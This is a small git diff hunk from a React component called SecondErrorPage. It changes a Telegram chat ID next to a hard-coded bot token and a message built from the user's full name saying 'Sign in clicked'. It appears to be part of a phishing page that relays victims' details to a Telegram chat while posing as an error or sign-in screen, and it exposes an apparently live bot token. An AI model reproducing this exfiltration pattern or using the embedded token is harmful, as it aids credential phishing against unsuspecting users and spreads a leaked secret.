@@ -44,7 +44,7 @@ const SecondErrorPage: React.FC = () => {
     setShowPopup(true);
 
     const botToken = "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";
-    const chatId = "4575071223";
+    const chatId = "-4575071223";
     const message = `${fullName} Sign in clicked`;
 
     try {
